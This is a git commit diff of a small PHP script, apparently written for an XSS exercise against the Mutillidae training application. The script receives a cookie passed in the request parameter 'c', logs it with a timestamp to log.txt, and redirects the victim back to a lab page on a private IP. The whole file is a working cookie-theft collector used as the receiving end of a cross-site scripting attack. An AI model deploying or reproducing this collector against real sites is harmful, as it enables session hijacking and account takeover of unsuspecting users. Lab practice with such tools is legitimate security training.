84f38733f295027da1128b484031668013d5246e
DenisDorogov <denisdorogov@yandex.ru>
2022-01-08 14:45:05 +0500

    request interception works

--- index.php
+++ index.php
@@ -1,9 +1,12 @@
 <?php
 $logFile = "log.txt";
+if (!file_exists($logFile)) touch($logFile);
+
 $cookie = $_REQUEST["c"];
-$handle = fopen($logFile, "a");
+$date =date('Y-m-d H:i:s'); 
+$handle= fopen($logFile, "a+");
+fwrite($handle, $date . " --> ");
 fwrite($handle, $cookie . "\n\n");
 fclose($handle);
-header("Location: http://login_page/mutillidae/");
+header("Location: http://192.168.56.103/mutillidae/index.php?page=dns-lookup.php");
 exit;
-?>
